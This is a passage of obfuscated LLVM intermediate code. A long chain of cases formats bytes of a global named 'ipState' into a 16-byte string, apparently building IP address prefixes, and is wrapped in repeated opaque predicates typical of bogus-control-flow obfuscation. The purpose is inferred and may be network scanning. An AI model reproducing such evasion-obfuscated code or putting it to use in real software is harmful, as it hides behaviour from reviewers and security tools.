originalBB394:                                    ; preds = %originalBB394alteredBB, %3260
  %3269 = load i32, i32* %1, align 4
  %3270 = icmp eq i32 %3269, 165
  %3271 = load i32, i32* @x.65
  %3272 = load i32, i32* @y.66
  %3273 = sub i32 %3271, 1
  %3274 = mul i32 %3271, %3273
  %3275 = urem i32 %3274, 2
  %3276 = icmp eq i32 %3275, 0
  %3277 = icmp slt i32 %3272, 10
  %3278 = or i1 %3276, %3277
  br i1 %3278, label %originalBBpart2396, label %originalBB394alteredBB

originalBBpart2396:                               ; preds = %originalBB394
  br i1 %3270, label %3279, label %3286

; <label>:3279:                                   ; preds = %originalBBpart2396
  %3280 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3282 = zext i8 %3281 to i32
  %3283 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3284 = zext i8 %3283 to i32
  %3285 = call i32 (i8*, i8*, ...) @szprintf(i8* %3280, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.686, i32 0, i32 0), i32 %3282, i32 %3284)
  br label %3286

; <label>:3286:                                   ; preds = %3279, %originalBBpart2396
  %3287 = load i32, i32* %1, align 4
  %3288 = icmp eq i32 %3287, 166
  br i1 %3288, label %3289, label %3296

; <label>:3289:                                   ; preds = %3286
  %3290 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3291 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3292 = zext i8 %3291 to i32
  %3293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3294 = zext i8 %3293 to i32
  %3295 = call i32 (i8*, i8*, ...) @szprintf(i8* %3290, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.661, i32 0, i32 0), i32 %3292, i32 %3294)
  br label %3296

; <label>:3296:                                   ; preds = %3289, %3286
  %3297 = load i32, i32* %1, align 4
  %3298 = icmp eq i32 %3297, 167
  br i1 %3298, label %3299, label %3306

; <label>:3299:                                   ; preds = %3296
  %3300 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3302 = zext i8 %3301 to i32
  %3303 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3304 = zext i8 %3303 to i32
  %3305 = call i32 (i8*, i8*, ...) @szprintf(i8* %3300, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.663, i32 0, i32 0), i32 %3302, i32 %3304)
  br label %3306

; <label>:3306:                                   ; preds = %3299, %3296
  %3307 = load i32, i32* @x.65
  %3308 = load i32, i32* @y.66
  %3309 = sub i32 %3307, 1
  %3310 = mul i32 %3307, %3309
  %3311 = urem i32 %3310, 2
  %3312 = icmp eq i32 %3311, 0
  %3313 = icmp slt i32 %3308, 10
  %3314 = or i1 %3312, %3313
  br i1 %3314, label %originalBB398, label %originalBB398alteredBB

originalBB398:                                    ; preds = %originalBB398alteredBB, %3306
  %3315 = load i32, i32* %1, align 4
  %3316 = icmp eq i32 %3315, 168
  %3317 = load i32, i32* @x.65
  %3318 = load i32, i32* @y.66
  %3319 = sub i32 %3317, 1
  %3320 = mul i32 %3317, %3319
  %3321 = urem i32 %3320, 2
  %3322 = icmp eq i32 %3321, 0
  %3323 = icmp slt i32 %3318, 10
  %3324 = or i1 %3322, %3323
  br i1 %3324, label %originalBBpart2400, label %originalBB398alteredBB

originalBBpart2400:                               ; preds = %originalBB398
  br i1 %3316, label %3325, label %3348

; <label>:3325:                                   ; preds = %originalBBpart2400
  %3326 = load i32, i32* @x.65
  %3327 = load i32, i32* @y.66
  %3328 = sub i32 %3326, 1
  %3329 = mul i32 %3326, %3328
  %3330 = urem i32 %3329, 2
  %3331 = icmp eq i32 %3330, 0
  %3332 = icmp slt i32 %3327, 10
  %3333 = or i1 %3331, %3332
  br i1 %3333, label %originalBB402, label %originalBB402alteredBB

originalBB402:                                    ; preds = %originalBB402alteredBB, %3325
  %3334 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3335 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3336 = zext i8 %3335 to i32
  %3337 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3338 = zext i8 %3337 to i32
  %3339 = call i32 (i8*, i8*, ...) @szprintf(i8* %3334, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.664, i32 0, i32 0), i32 %3336, i32 %3338)
  %3340 = load i32, i32* @x.65
  %3341 = load i32, i32* @y.66
  %3342 = sub i32 %3340, 1
  %3343 = mul i32 %3340, %3342
  %3344 = urem i32 %3343, 2
  %3345 = icmp eq i32 %3344, 0
  %3346 = icmp slt i32 %3341, 10
  %3347 = or i1 %3345, %3346
  br i1 %3347, label %originalBBpart2404, label %originalBB402alteredBB

originalBBpart2404:                               ; preds = %originalBB402
  br label %3348

; <label>:3348:                                   ; preds = %originalBBpart2404, %originalBBpart2400
  %3349 = load i32, i32* @x.65
  %3350 = load i32, i32* @y.66
  %3351 = sub i32 %3349, 1
  %3352 = mul i32 %3349, %3351
  %3353 = urem i32 %3352, 2
  %3354 = icmp eq i32 %3353, 0
  %3355 = icmp slt i32 %3350, 10
  %3356 = or i1 %3354, %3355
  br i1 %3356, label %originalBB406, label %originalBB406alteredBB

originalBB406:                                    ; preds = %originalBB406alteredBB, %3348
  %3357 = load i32, i32* %1, align 4
  %3358 = icmp eq i32 %3357, 169
  %3359 = load i32, i32* @x.65
  %3360 = load i32, i32* @y.66
  %3361 = sub i32 %3359, 1
  %3362 = mul i32 %3359, %3361
  %3363 = urem i32 %3362, 2
  %3364 = icmp eq i32 %3363, 0
  %3365 = icmp slt i32 %3360, 10
  %3366 = or i1 %3364, %3365
  br i1 %3366, label %originalBBpart2408, label %originalBB406alteredBB

originalBBpart2408:                               ; preds = %originalBB406
  br i1 %3358, label %3367, label %3374

; <label>:3367:                                   ; preds = %originalBBpart2408
  %3368 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3370 = zext i8 %3369 to i32
  %3371 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3372 = zext i8 %3371 to i32
  %3373 = call i32 (i8*, i8*, ...) @szprintf(i8* %3368, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.687, i32 0, i32 0), i32 %3370, i32 %3372)
  br label %3374

; <label>:3374:                                   ; preds = %3367, %originalBBpart2408
  %3375 = load i32, i32* %1, align 4
  %3376 = icmp eq i32 %3375, 170
  br i1 %3376, label %3377, label %3384

; <label>:3377:                                   ; preds = %3374
  %3378 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3379 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3380 = zext i8 %3379 to i32
  %3381 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3382 = zext i8 %3381 to i32
  %3383 = call i32 (i8*, i8*, ...) @szprintf(i8* %3378, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.688, i32 0, i32 0), i32 %3380, i32 %3382)
  br label %3384

; <label>:3384:                                   ; preds = %3377, %3374
  %3385 = load i32, i32* %1, align 4
  %3386 = icmp eq i32 %3385, 171
  br i1 %3386, label %3387, label %3394

; <label>:3387:                                   ; preds = %3384
  %3388 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3389 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3390 = zext i8 %3389 to i32
  %3391 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3392 = zext i8 %3391 to i32
  %3393 = call i32 (i8*, i8*, ...) @szprintf(i8* %3388, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.689, i32 0, i32 0), i32 %3390, i32 %3392)
  br label %3394

; <label>:3394:                                   ; preds = %3387, %3384
  %3395 = load i32, i32* @x.65
  %3396 = load i32, i32* @y.66
  %3397 = sub i32 %3395, 1
  %3398 = mul i32 %3395, %3397
  %3399 = urem i32 %3398, 2
  %3400 = icmp eq i32 %3399, 0
  %3401 = icmp slt i32 %3396, 10
  %3402 = or i1 %3400, %3401
  br i1 %3402, label %originalBB410, label %originalBB410alteredBB

originalBB410:                                    ; preds = %originalBB410alteredBB, %3394
  %3403 = load i32, i32* %1, align 4
  %3404 = icmp eq i32 %3403, 172
  %3405 = load i32, i32* @x.65
  %3406 = load i32, i32* @y.66
  %3407 = sub i32 %3405, 1
  %3408 = mul i32 %3405, %3407
  %3409 = urem i32 %3408, 2
  %3410 = icmp eq i32 %3409, 0
  %3411 = icmp slt i32 %3406, 10
  %3412 = or i1 %3410, %3411
  br i1 %3412, label %originalBBpart2412, label %originalBB410alteredBB

originalBBpart2412:                               ; preds = %originalBB410
  br i1 %3404, label %3413, label %3420

; <label>:3413:                                   ; preds = %originalBBpart2412
  %3414 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3415 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3416 = zext i8 %3415 to i32
  %3417 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3418 = zext i8 %3417 to i32
  %3419 = call i32 (i8*, i8*, ...) @szprintf(i8* %3414, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.822, i32 0, i32 0), i32 %3416, i32 %3418)
  br label %3420

; <label>:3420:                                   ; preds = %3413, %originalBBpart2412
  %3421 = load i32, i32* %1, align 4
  %3422 = icmp eq i32 %3421, 173
  br i1 %3422, label %3423, label %3430

; <label>:3423:                                   ; preds = %3420
  %3424 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3426 = zext i8 %3425 to i32
  %3427 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3428 = zext i8 %3427 to i32
  %3429 = call i32 (i8*, i8*, ...) @szprintf(i8* %3424, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.823, i32 0, i32 0), i32 %3426, i32 %3428)
  br label %3430

; <label>:3430:                                   ; preds = %3423, %3420
  %3431 = load i32, i32* @x.65
  %3432 = load i32, i32* @y.66
  %3433 = sub i32 %3431, 1
  %3434 = mul i32 %3431, %3433
  %3435 = urem i32 %3434, 2
  %3436 = icmp eq i32 %3435, 0
  %3437 = icmp slt i32 %3432, 10
  %3438 = or i1 %3436, %3437
  br i1 %3438, label %originalBB414, label %originalBB414alteredBB

originalBB414:                                    ; preds = %originalBB414alteredBB, %3430
  %3439 = load i32, i32* %1, align 4
  %3440 = icmp eq i32 %3439, 174
  %3441 = load i32, i32* @x.65
  %3442 = load i32, i32* @y.66
  %3443 = sub i32 %3441, 1
  %3444 = mul i32 %3441, %3443
  %3445 = urem i32 %3444, 2
  %3446 = icmp eq i32 %3445, 0
  %3447 = icmp slt i32 %3442, 10
  %3448 = or i1 %3446, %3447
  br i1 %3448, label %originalBBpart2416, label %originalBB414alteredBB

originalBBpart2416:                               ; preds = %originalBB414
  br i1 %3440, label %3449, label %3456

; <label>:3449:                                   ; preds = %originalBBpart2416
  %3450 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3452 = zext i8 %3451 to i32
  %3453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3454 = zext i8 %3453 to i32
  %3455 = call i32 (i8*, i8*, ...) @szprintf(i8* %3450, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.690, i32 0, i32 0), i32 %3452, i32 %3454)
  br label %3456

; <label>:3456:                                   ; preds = %3449, %originalBBpart2416
  %3457 = load i32, i32* %1, align 4
  %3458 = icmp eq i32 %3457, 175
  br i1 %3458, label %3459, label %3482

; <label>:3459:                                   ; preds = %3456
  %3460 = load i32, i32* @x.65
  %3461 = load i32, i32* @y.66
  %3462 = sub i32 %3460, 1
  %3463 = mul i32 %3460, %3462
  %3464 = urem i32 %3463, 2
  %3465 = icmp eq i32 %3464, 0
  %3466 = icmp slt i32 %3461, 10
  %3467 = or i1 %3465, %3466
  br i1 %3467, label %originalBB418, label %originalBB418alteredBB

originalBB418:                                    ; preds = %originalBB418alteredBB, %3459
  %3468 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3469 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3470 = zext i8 %3469 to i32
  %3471 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3472 = zext i8 %3471 to i32
  %3473 = call i32 (i8*, i8*, ...) @szprintf(i8* %3468, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.824, i32 0, i32 0), i32 %3470, i32 %3472)
  %3474 = load i32, i32* @x.65
  %3475 = load i32, i32* @y.66
  %3476 = sub i32 %3474, 1
  %3477 = mul i32 %3474, %3476
  %3478 = urem i32 %3477, 2
  %3479 = icmp eq i32 %3478, 0
  %3480 = icmp slt i32 %3475, 10
  %3481 = or i1 %3479, %3480
  br i1 %3481, label %originalBBpart2420, label %originalBB418alteredBB

originalBBpart2420:                               ; preds = %originalBB418
  br label %3482

; <label>:3482:                                   ; preds = %originalBBpart2420, %3456
  %3483 = load i32, i32* %1, align 4
  %3484 = icmp eq i32 %3483, 176
  br i1 %3484, label %3485, label %3492

; <label>:3485:                                   ; preds = %3482
  %3486 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3487 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3488 = zext i8 %3487 to i32
  %3489 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3490 = zext i8 %3489 to i32
  %3491 = call i32 (i8*, i8*, ...) @szprintf(i8* %3486, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.825, i32 0, i32 0), i32 %3488, i32 %3490)
  br label %3492

; <label>:3492:                                   ; preds = %3485, %3482
  %3493 = load i32, i32* @x.65
  %3494 = load i32, i32* @y.66
  %3495 = sub i32 %3493, 1
  %3496 = mul i32 %3493, %3495
  %3497 = urem i32 %3496, 2
  %3498 = icmp eq i32 %3497, 0
  %3499 = icmp slt i32 %3494, 10
  %3500 = or i1 %3498, %3499
  br i1 %3500, label %originalBB422, label %originalBB422alteredBB

originalBB422:                                    ; preds = %originalBB422alteredBB, %3492
  %3501 = load i32, i32* %1, align 4
  %3502 = icmp eq i32 %3501, 177
  %3503 = load i32, i32* @x.65
  %3504 = load i32, i32* @y.66
  %3505 = sub i32 %3503, 1
  %3506 = mul i32 %3503, %3505
  %3507 = urem i32 %3506, 2
  %3508 = icmp eq i32 %3507, 0
  %3509 = icmp slt i32 %3504, 10
  %3510 = or i1 %3508, %3509
  br i1 %3510, label %originalBBpart2424, label %originalBB422alteredBB

originalBBpart2424:                               ; preds = %originalBB422
  br i1 %3502, label %3511, label %3518

; <label>:3511:                                   ; preds = %originalBBpart2424
  %3512 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3514 = zext i8 %3513 to i32
  %3515 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3516 = zext i8 %3515 to i32
  %3517 = call i32 (i8*, i8*, ...) @szprintf(i8* %3512, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.691, i32 0, i32 0), i32 %3514, i32 %3516)
  br label %3518

; <label>:3518:                                   ; preds = %3511, %originalBBpart2424
  %3519 = load i32, i32* %1, align 4
  %3520 = icmp eq i32 %3519, 178
  br i1 %3520, label %3521, label %3544

; <label>:3521:                                   ; preds = %3518
  %3522 = load i32, i32* @x.65
  %3523 = load i32, i32* @y.66
  %3524 = sub i32 %3522, 1
  %3525 = mul i32 %3522, %3524
  %3526 = urem i32 %3525, 2
  %3527 = icmp eq i32 %3526, 0
  %3528 = icmp slt i32 %3523, 10
  %3529 = or i1 %3527, %3528
  br i1 %3529, label %originalBB426, label %originalBB426alteredBB

originalBB426:                                    ; preds = %originalBB426alteredBB, %3521
  %3530 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3531 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3532 = zext i8 %3531 to i32
  %3533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3534 = zext i8 %3533 to i32
  %3535 = call i32 (i8*, i8*, ...) @szprintf(i8* %3530, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.692, i32 0, i32 0), i32 %3532, i32 %3534)
  %3536 = load i32, i32* @x.65
  %3537 = load i32, i32* @y.66
  %3538 = sub i32 %3536, 1
  %3539 = mul i32 %3536, %3538
  %3540 = urem i32 %3539, 2
  %3541 = icmp eq i32 %3540, 0
  %3542 = icmp slt i32 %3537, 10
  %3543 = or i1 %3541, %3542
  br i1 %3543, label %originalBBpart2428, label %originalBB426alteredBB

originalBBpart2428:                               ; preds = %originalBB426
  br label %3544

; <label>:3544:                                   ; preds = %originalBBpart2428, %3518
  %3545 = load i32, i32* @x.65
  %3546 = load i32, i32* @y.66
  %3547 = sub i32 %3545, 1
  %3548 = mul i32 %3545, %3547
  %3549 = urem i32 %3548, 2
  %3550 = icmp eq i32 %3549, 0
  %3551 = icmp slt i32 %3546, 10
  %3552 = or i1 %3550, %3551
  br i1 %3552, label %originalBB430, label %originalBB430alteredBB

originalBB430:                                    ; preds = %originalBB430alteredBB, %3544
  %3553 = load i32, i32* %1, align 4
  %3554 = icmp eq i32 %3553, 179
  %3555 = load i32, i32* @x.65
  %3556 = load i32, i32* @y.66
  %3557 = sub i32 %3555, 1
  %3558 = mul i32 %3555, %3557
  %3559 = urem i32 %3558, 2
  %3560 = icmp eq i32 %3559, 0
  %3561 = icmp slt i32 %3556, 10
  %3562 = or i1 %3560, %3561
  br i1 %3562, label %originalBBpart2432, label %originalBB430alteredBB

originalBBpart2432:                               ; preds = %originalBB430
  br i1 %3554, label %3563, label %3570

; <label>:3563:                                   ; preds = %originalBBpart2432
  %3564 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3565 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3566 = zext i8 %3565 to i32
  %3567 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3568 = zext i8 %3567 to i32
  %3569 = call i32 (i8*, i8*, ...) @szprintf(i8* %3564, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.693, i32 0, i32 0), i32 %3566, i32 %3568)
  br label %3570

; <label>:3570:                                   ; preds = %3563, %originalBBpart2432
  %3571 = load i32, i32* %1, align 4
  %3572 = icmp eq i32 %3571, 180
  br i1 %3572, label %3573, label %3580

; <label>:3573:                                   ; preds = %3570
  %3574 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3575 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3576 = zext i8 %3575 to i32
  %3577 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3578 = zext i8 %3577 to i32
  %3579 = call i32 (i8*, i8*, ...) @szprintf(i8* %3574, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.826, i32 0, i32 0), i32 %3576, i32 %3578)
  br label %3580

; <label>:3580:                                   ; preds = %3573, %3570
  %3581 = load i32, i32* @x.65
  %3582 = load i32, i32* @y.66
  %3583 = sub i32 %3581, 1
  %3584 = mul i32 %3581, %3583
  %3585 = urem i32 %3584, 2
  %3586 = icmp eq i32 %3585, 0
  %3587 = icmp slt i32 %3582, 10
  %3588 = or i1 %3586, %3587
  br i1 %3588, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %3580
  %3589 = load i32, i32* %1, align 4
  %3590 = icmp eq i32 %3589, 181
  %3591 = load i32, i32* @x.65
  %3592 = load i32, i32* @y.66
  %3593 = sub i32 %3591, 1
  %3594 = mul i32 %3591, %3593
  %3595 = urem i32 %3594, 2
  %3596 = icmp eq i32 %3595, 0
  %3597 = icmp slt i32 %3592, 10
  %3598 = or i1 %3596, %3597
  br i1 %3598, label %originalBBpart2436, label %originalBB434alteredBB

originalBBpart2436:                               ; preds = %originalBB434
  br i1 %3590, label %3599, label %3606

; <label>:3599:                                   ; preds = %originalBBpart2436
  %3600 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3601 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3602 = zext i8 %3601 to i32
  %3603 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3604 = zext i8 %3603 to i32
  %3605 = call i32 (i8*, i8*, ...) @szprintf(i8* %3600, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.827, i32 0, i32 0), i32 %3602, i32 %3604)
  br label %3606

; <label>:3606:                                   ; preds = %3599, %originalBBpart2436
  %3607 = load i32, i32* @x.65
  %3608 = load i32, i32* @y.66
  %3609 = sub i32 %3607, 1
  %3610 = mul i32 %3607, %3609
  %3611 = urem i32 %3610, 2
  %3612 = icmp eq i32 %3611, 0
  %3613 = icmp slt i32 %3608, 10
  %3614 = or i1 %3612, %3613
  br i1 %3614, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %3606
  %3615 = load i32, i32* %1, align 4
  %3616 = icmp eq i32 %3615, 182
  %3617 = load i32, i32* @x.65
  %3618 = load i32, i32* @y.66
  %3619 = sub i32 %3617, 1
  %3620 = mul i32 %3617, %3619
  %3621 = urem i32 %3620, 2
  %3622 = icmp eq i32 %3621, 0
  %3623 = icmp slt i32 %3618, 10
  %3624 = or i1 %3622, %3623
  br i1 %3624, label %originalBBpart2440, label %originalBB438alteredBB

originalBBpart2440:                               ; preds = %originalBB438
  br i1 %3616, label %3625, label %3632

; <label>:3625:                                   ; preds = %originalBBpart2440
  %3626 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3627 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3628 = zext i8 %3627 to i32
  %3629 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3630 = zext i8 %3629 to i32
  %3631 = call i32 (i8*, i8*, ...) @szprintf(i8* %3626, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.694, i32 0, i32 0), i32 %3628, i32 %3630)
  br label %3632

; <label>:3632:                                   ; preds = %3625, %originalBBpart2440
  %3633 = load i32, i32* %1, align 4
  %3634 = icmp eq i32 %3633, 183
  br i1 %3634, label %3635, label %3658

; <label>:3635:                                   ; preds = %3632
  %3636 = load i32, i32* @x.65
  %3637 = load i32, i32* @y.66
  %3638 = sub i32 %3636, 1
  %3639 = mul i32 %3636, %3638
  %3640 = urem i32 %3639, 2
  %3641 = icmp eq i32 %3640, 0
  %3642 = icmp slt i32 %3637, 10
  %3643 = or i1 %3641, %3642
  br i1 %3643, label %originalBB442, label %originalBB442alteredBB

originalBB442:                                    ; preds = %originalBB442alteredBB, %3635
  %3644 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3645 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3646 = zext i8 %3645 to i32
  %3647 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3648 = zext i8 %3647 to i32
  %3649 = call i32 (i8*, i8*, ...) @szprintf(i8* %3644, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.695, i32 0, i32 0), i32 %3646, i32 %3648)
  %3650 = load i32, i32* @x.65
  %3651 = load i32, i32* @y.66
  %3652 = sub i32 %3650, 1
  %3653 = mul i32 %3650, %3652
  %3654 = urem i32 %3653, 2
  %3655 = icmp eq i32 %3654, 0
  %3656 = icmp slt i32 %3651, 10
  %3657 = or i1 %3655, %3656
  br i1 %3657, label %originalBBpart2444, label %originalBB442alteredBB

originalBBpart2444:                               ; preds = %originalBB442
  br label %3658

; <label>:3658:                                   ; preds = %originalBBpart2444, %3632
  %3659 = load i32, i32* %1, align 4
  %3660 = icmp eq i32 %3659, 184
  br i1 %3660, label %3661, label %3668

; <label>:3661:                                   ; preds = %3658
  %3662 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3663 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3664 = zext i8 %3663 to i32
  %3665 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3666 = zext i8 %3665 to i32
  %3667 = call i32 (i8*, i8*, ...) @szprintf(i8* %3662, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.696, i32 0, i32 0), i32 %3664, i32 %3666)
  br label %3668

; <label>:3668:                                   ; preds = %3661, %3658
  %3669 = load i32, i32* %1, align 4
  %3670 = icmp eq i32 %3669, 185
  br i1 %3670, label %3671, label %3694

; <label>:3671:                                   ; preds = %3668
  %3672 = load i32, i32* @x.65
  %3673 = load i32, i32* @y.66
  %3674 = sub i32 %3672, 1
  %3675 = mul i32 %3672, %3674
  %3676 = urem i32 %3675, 2
  %3677 = icmp eq i32 %3676, 0
  %3678 = icmp slt i32 %3673, 10
  %3679 = or i1 %3677, %3678
  br i1 %3679, label %originalBB446, label %originalBB446alteredBB

originalBB446:                                    ; preds = %originalBB446alteredBB, %3671
  %3680 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3681 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3682 = zext i8 %3681 to i32
  %3683 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3684 = zext i8 %3683 to i32
  %3685 = call i32 (i8*, i8*, ...) @szprintf(i8* %3680, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.828, i32 0, i32 0), i32 %3682, i32 %3684)
  %3686 = load i32, i32* @x.65
  %3687 = load i32, i32* @y.66
  %3688 = sub i32 %3686, 1
  %3689 = mul i32 %3686, %3688
  %3690 = urem i32 %3689, 2
  %3691 = icmp eq i32 %3690, 0
  %3692 = icmp slt i32 %3687, 10
  %3693 = or i1 %3691, %3692
  br i1 %3693, label %originalBBpart2448, label %originalBB446alteredBB

originalBBpart2448:                               ; preds = %originalBB446
  br label %3694

; <label>:3694:                                   ; preds = %originalBBpart2448, %3668
  %3695 = load i32, i32* %1, align 4
  %3696 = icmp eq i32 %3695, 186
  br i1 %3696, label %3697, label %3720

; <label>:3697:                                   ; preds = %3694
  %3698 = load i32, i32* @x.65
  %3699 = load i32, i32* @y.66
  %3700 = sub i32 %3698, 1
  %3701 = mul i32 %3698, %3700
  %3702 = urem i32 %3701, 2
  %3703 = icmp eq i32 %3702, 0
  %3704 = icmp slt i32 %3699, 10
  %3705 = or i1 %3703, %3704
  br i1 %3705, label %originalBB450, label %originalBB450alteredBB

originalBB450:                                    ; preds = %originalBB450alteredBB, %3697
  %3706 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %3707 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3708 = zext i8 %3707 to i32
  %3709 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3710 = zext i8 %3709 to i32
  %3711 = call i32 (i8*, i8*, ...) @szprintf(i8* %3706, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.829, i32 0, i32 0), i32 %3708, i32 %3710)
  %3712 = load i32, i32* @x.65
  %3713 = load i32, i32* @y.66
  %3714 = sub i32 %3712, 1
  %3715 = mul i32 %3712, %3714
  %3716 = urem i32 %3715, 2
  %3717 = icmp eq i32 %3716, 0
  %3718 = icmp slt i32 %3713, 10
  %3719 = or i1 %3717, %3718
  br i1 %3719, label %originalBBpart2452, label %originalBB450alteredBB

originalBBpart2452:                               ; preds = %originalBB450
